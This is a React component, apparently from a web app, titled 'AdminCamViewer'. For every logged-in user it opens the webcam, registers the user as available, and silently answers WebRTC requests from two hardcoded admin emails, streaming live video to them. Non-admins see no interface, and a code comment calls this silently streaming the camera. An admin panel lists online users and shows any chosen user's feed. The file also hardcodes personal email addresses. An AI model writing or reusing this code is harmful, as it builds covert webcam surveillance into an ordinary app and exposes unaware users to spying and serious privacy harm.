'use client';

import { useEffect, useRef, useState, useCallback } from 'react';
import { io, Socket } from 'socket.io-client';

const SOCKET_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-production-265c.up.railway.app';
const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];

const STUN_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
  ],
};

interface CamUser {
  email: string;
  username: string;
  socketId: string;
  connectedAt: number;
}

interface AdminCamViewerProps {
  userEmail: string;
  username: string;
  isOpen: boolean;
  onOpenChange: (open: boolean) => void;
  onCamUsersCount?: (count: number) => void;
}

export default function AdminCamViewer({ userEmail, username, isOpen, onOpenChange, onCamUsersCount }: AdminCamViewerProps) {
  const isAdmin = !!userEmail && ADMIN_EMAILS.includes(userEmail.toLowerCase().trim());

  const [camUsers, setCamUsers] = useState<CamUser[]>([]);
  const [viewingUser, setViewingUser] = useState<CamUser | null>(null);
  const [streamStatus, setStreamStatus] = useState<'idle' | 'connecting' | 'live' | 'error'>('idle');

  // Notify parent of count changes
  useEffect(() => {
    onCamUsersCount?.(camUsers.length);
  }, [camUsers.length, onCamUsersCount]);

  const socketRef = useRef<Socket | null>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const remoteVideoRef = useRef<HTMLVideoElement | null>(null);
  const viewingSocketIdRef = useRef<string | null>(null);

  // ── User side: silently stream camera ────────────────────────────────────────
  const localStreamRef = useRef<MediaStream | null>(null);
  const userPeerRef = useRef<RTCPeerConnection | null>(null);

  // Connect socket and register as cam-ready (all users)
  useEffect(() => {
    if (!userEmail) return;

    const socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      reconnectionAttempts: 5,
    });
    socketRef.current = socket;

    socket.on('connect', () => {
      // Identify with main socket room
      socket.emit('identify', { email: userEmail });

      // Start camera for ALL users (including admin) to request camera permission and announce readiness
      startUserCamera(socket);

      // If admin: request current cam user list
      if (isAdmin) {
        socket.emit('cam_get_users');
      }
    });

    // Realtime auto-refresh interval for admin (3-second polling fallback for instant list updates)
    let refreshInterval: NodeJS.Timeout | null = null;
    if (isAdmin) {
      refreshInterval = setInterval(() => {
        if (socket.connected) {
          socket.emit('cam_get_users');
        }
      }, 3000);
    }

    // ── Admin listeners ──
    if (isAdmin) {
      socket.on('cam_users_list', (list: CamUser[]) => {
        setCamUsers(list.map(u => ({ ...u, connectedAt: Date.now() })));
      });

      socket.on('cam_user_online', (user: CamUser) => {
        setCamUsers(prev => {
          const exists = prev.find(u => u.socketId === user.socketId);
          if (exists) return prev;
          return [...prev, { ...user, connectedAt: Date.now() }];
        });
      });

      socket.on('cam_user_offline', ({ socketId }: { socketId: string }) => {
        setCamUsers(prev => prev.filter(u => u.socketId !== socketId));
        if (viewingSocketIdRef.current === socketId) {
          stopViewing();
        }
      });

      // Receive WebRTC answer/ICE from target user
      socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
        if (signal.type === 'offer') {
          // If another admin or test session offers to view
          await handleUserOffer(fromSocketId, signal, socket);
          return;
        }
        if (!peerRef.current) return;
        if (signal.type === 'answer') {
          await peerRef.current.setRemoteDescription(new RTCSessionDescription(signal));
        } else if (signal.candidate) {
          await peerRef.current.addIceCandidate(new RTCIceCandidate(signal));
        }
      });
    } else {
      // Regular user receives WebRTC offer from admin
      socket.on('cam_signal_incoming', async ({ fromSocketId, signal }: { fromSocketId: string; signal: any }) => {
        if (signal.type === 'offer') {
          await handleUserOffer(fromSocketId, signal, socket);
        } else if (signal.candidate && userPeerRef.current) {
          await userPeerRef.current.addIceCandidate(new RTCIceCandidate(signal));
        }
      });
    }

    return () => {
      if (refreshInterval) clearInterval(refreshInterval);
      socket.disconnect();
      localStreamRef.current?.getTracks().forEach(t => t.stop());
      userPeerRef.current?.close();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [userEmail, isAdmin]);

  // ── Acquire camera stream for any connected client ──────────────────────────
  const startUserCamera = async (socket: Socket) => {
    if (localStreamRef.current) {
      socket.emit('cam_viewer_ready', { email: userEmail, username });
      return;
    }

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false,
      });
      localStreamRef.current = stream;
      socket.emit('cam_viewer_ready', { email: userEmail, username });
    } catch {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        localStreamRef.current = stream;
        socket.emit('cam_viewer_ready', { email: userEmail, username });
      } catch (err) {
        console.warn('Camera permission denied or camera not available:', err);
      }
    }
  };

  // ── Answer admin's WebRTC offer ───────────────────────────────────────────
  const handleUserOffer = async (adminSocketId: string, offer: RTCSessionDescriptionInit, socket: Socket) => {
    if (!localStreamRef.current) {
      await startUserCamera(socket);
    }
    if (!localStreamRef.current) return;

    const peer = new RTCPeerConnection(STUN_SERVERS);
    userPeerRef.current = peer;

    // Add local tracks
    localStreamRef.current.getTracks().forEach(track => {
      peer.addTrack(track, localStreamRef.current!);
    });

    // ICE candidates
    peer.onicecandidate = (e) => {
      if (e.candidate) {
        socket.emit('cam_signal_relay', {
          toSocketId: adminSocketId,
          signal: e.candidate,
        });
      }
    };

    await peer.setRemoteDescription(new RTCSessionDescription(offer));
    const answer = await peer.createAnswer();
    await peer.setLocalDescription(answer);

    socket.emit('cam_signal_relay', {
      toSocketId: adminSocketId,
      signal: answer,
    });
  };

  // ── Admin: start viewing a user ───────────────────────────────────────────
  const startViewing = useCallback(async (user: CamUser) => {
    stopViewing();
    setViewingUser(user);
    setStreamStatus('connecting');
    viewingSocketIdRef.current = user.socketId;

    const peer = new RTCPeerConnection(STUN_SERVERS);
    peerRef.current = peer;

    peer.ontrack = (e) => {
      if (remoteVideoRef.current && e.streams[0]) {
        remoteVideoRef.current.srcObject = e.streams[0];
        setStreamStatus('live');
      }
    };

    peer.onicecandidate = (e) => {
      if (e.candidate && socketRef.current) {
        socketRef.current.emit('cam_view_request', {
          targetSocketId: user.socketId,
          signal: e.candidate,
        });
      }
    };

    peer.oniceconnectionstatechange = () => {
      if (peer.iceConnectionState === 'failed' || peer.iceConnectionState === 'disconnected') {
        setStreamStatus('error');
      }
    };

    // Create offer
    const offer = await peer.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
    await peer.setLocalDescription(offer);

    socketRef.current?.emit('cam_view_request', {
      targetSocketId: user.socketId,
      signal: offer,
    });
  }, []);

  const stopViewing = useCallback(() => {
    peerRef.current?.close();
    peerRef.current = null;
    if (remoteVideoRef.current) remoteVideoRef.current.srcObject = null;
    setViewingUser(null);
    setStreamStatus('idle');
    viewingSocketIdRef.current = null;
  }, []);

  // Only render for admin
  if (!isAdmin) return null;

  const activeCount = camUsers.length;

  return (
    <>
      {/* Full-Screen Admin Panel */}
      {isOpen && (
        <div
          className="fixed inset-0 z-[9999] flex flex-col md:flex-row"
          style={{ background: '#000000', fontFamily: 'system-ui, sans-serif' }}
        >
          {/* User list sidebar (hidden on mobile when viewing a stream) */}
          <div
            className={`w-full md:w-[280px] flex-shrink-0 flex flex-col border-b md:border-b-0 md:border-r overflow-hidden h-full ${
              viewingUser ? 'hidden md:flex' : 'flex'
            }`}
            style={{ borderColor: 'rgba(255,255,255,0.08)', background: '#0a0a0a' }}
          >
            {/* Header */}
            <div
              className="px-5 py-4 flex items-center justify-between border-b flex-shrink-0"
              style={{ borderColor: 'rgba(255,255,255,0.08)' }}
            >
              <div>
                <p className="text-white font-semibold text-sm">Cam Viewer</p>
                <p className="text-xs mt-0.5" style={{ color: 'rgba(255,255,255,0.4)' }}>
                  {activeCount} active {activeCount === 1 ? 'user' : 'users'}
                </p>
              </div>
              <button
                onClick={() => { onOpenChange(false); stopViewing(); }}
                className="w-8 h-8 rounded-full flex items-center justify-center transition-colors hover:bg-white/10"
                style={{ color: 'rgba(255,255,255,0.5)' }}
              >
                <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Refresh button */}
            <div className="px-5 py-2 flex-shrink-0">
              <button
                onClick={() => socketRef.current?.emit('cam_get_users')}
                className="w-full py-2.5 rounded-xl text-xs font-medium transition-colors cursor-pointer"
                style={{
                  background: 'rgba(255,255,255,0.06)',
                  color: 'rgba(255,255,255,0.7)',
                  border: '1px solid rgba(255,255,255,0.08)',
                }}
              >
                ↻ Refresh List
              </button>
            </div>

            {/* User list */}
            <div className="flex-1 overflow-y-auto px-3 py-2 space-y-1">
              {camUsers.length === 0 ? (
                <div className="flex flex-col items-center justify-center h-48 text-center px-4">
                  <div
                    className="w-12 h-12 rounded-full flex items-center justify-center mb-3"
                    style={{ background: 'rgba(255,255,255,0.06)' }}
                  >
                    <svg width="20" height="20" fill="none" stroke="rgba(255,255,255,0.3)" viewBox="0 0 24 24" strokeWidth="1.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  </div>
                  <p className="text-xs font-medium text-white/40">No active users online</p>
                  <p className="text-[11px] text-white/20 mt-1">Users will appear here when they open the app</p>
                </div>
              ) : (
                camUsers.map(user => {
                  const isViewing = viewingUser?.socketId === user.socketId;
                  return (
                    <button
                      key={user.socketId}
                      onClick={() => isViewing ? stopViewing() : startViewing(user)}
                      className="w-full flex items-center gap-3 px-3.5 py-3 rounded-xl transition-all text-left cursor-pointer"
                      style={{
                        background: isViewing ? 'rgba(239,68,68,0.15)' : 'rgba(255,255,255,0.04)',
                        border: `1px solid ${isViewing ? 'rgba(239,68,68,0.3)' : 'rgba(255,255,255,0.06)'}`,
                      }}
                    >
                      {/* Avatar */}
                      <div
                        className="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 text-xs font-bold uppercase"
                        style={{
                          background: isViewing ? 'rgba(239,68,68,0.25)' : 'rgba(255,255,255,0.1)',
                          color: isViewing ? '#f87171' : 'rgba(255,255,255,0.6)',
                        }}
                      >
                        {(user.username || user.email || '?').slice(0, 2)}
                      </div>
                      <div className="flex-1 min-w-0">
                        <p className="text-xs font-semibold truncate text-white">
                          {user.username || user.email?.split('@')[0] || 'User'}
                        </p>
                        <p className="text-[10px] truncate mt-0.5" style={{ color: 'rgba(255,255,255,0.3)' }}>
                          {user.email || '—'}
                        </p>
                      </div>
                      {/* Status indicator */}
                      <div
                        className="w-2 h-2 rounded-full flex-shrink-0"
                        style={{ background: isViewing ? '#ef4444' : '#22c55e' }}
                      />
                    </button>
                  );
                })
              )}
            </div>
          </div>

          {/* Right/Main: video feed */}
          <div
            className={`flex-1 flex flex-col items-center justify-center relative w-full h-full ${
              !viewingUser ? 'hidden md:flex' : 'flex'
            }`}
            style={{ background: '#000' }}
          >
            {!viewingUser ? (
              <div className="flex flex-col items-center gap-4 text-center px-6">
                <div
                  className="w-20 h-20 rounded-full flex items-center justify-center"
                  style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)' }}
                >
                  <svg width="32" height="32" fill="none" stroke="rgba(255,255,255,0.2)" viewBox="0 0 24 24" strokeWidth="1.5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 10l4.553-2.069A1 1 0 0121 8.868v6.264a1 1 0 01-1.447.894L15 14M4 8a2 2 0 00-2 2v4a2 2 0 002 2h8a2 2 0 002-2v-4a2 2 0 00-2-2H4z" />
                  </svg>
                </div>
                <p className="text-sm font-medium" style={{ color: 'rgba(255,255,255,0.25)' }}>
                  Select a user to view their camera
                </p>
              </div>
            ) : (
              <>
                {/* Mobile Back Button */}
                <button
                  onClick={stopViewing}
                  className="md:hidden absolute top-4 left-4 z-20 flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-medium text-white transition-colors"
                  style={{ background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(8px)', border: '1px solid rgba(255,255,255,0.15)' }}
                >
                  <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                  </svg>
                  <span>Users</span>
                </button>

                {/* Desktop Status badge */}
                <div
                  className="hidden md:flex absolute top-4 left-4 items-center gap-2 px-3 py-1.5 rounded-full z-10"
                  style={{ background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(8px)', border: '1px solid rgba(255,255,255,0.1)' }}
                >
                  <div
                    className="w-2 h-2 rounded-full"
                    style={{
                      background: streamStatus === 'live' ? '#ef4444' : streamStatus === 'connecting' ? '#f59e0b' : '#6b7280',
                      animation: streamStatus === 'live' ? 'pulse 2s infinite' : 'none',
                    }}
                  />
                  <span className="text-xs font-medium text-white">
                    {streamStatus === 'live' ? 'LIVE' : streamStatus === 'connecting' ? 'Connecting...' : 'Error'}
                  </span>
                  <span className="text-xs" style={{ color: 'rgba(255,255,255,0.4)' }}>
                    · {viewingUser.username || viewingUser.email?.split('@')[0]}
                  </span>
                </div>

                {/* Stop viewing / Close button */}
                <button
                  onClick={() => { stopViewing(); onOpenChange(false); }}
                  className="absolute top-4 right-4 z-20 flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-medium text-white transition-colors hover:bg-white/20 cursor-pointer"
                  style={{ background: 'rgba(0,0,0,0.6)', border: '1px solid rgba(255,255,255,0.15)', backdropFilter: 'blur(8px)' }}
                >
                  <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                  Close
                </button>

                {/* Video element */}
                <video
                  ref={remoteVideoRef}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-contain"
                  style={{ maxHeight: '100%' }}
                />

                {streamStatus === 'connecting' && (
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="flex flex-col items-center gap-3">
                      <div
                        className="w-10 h-10 border-2 rounded-full animate-spin"
                        style={{ borderColor: 'rgba(255,255,255,0.2)', borderTopColor: 'white' }}
                      />
                      <p className="text-sm text-white/50">Establishing connection...</p>
                    </div>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}
    </>
  );
}
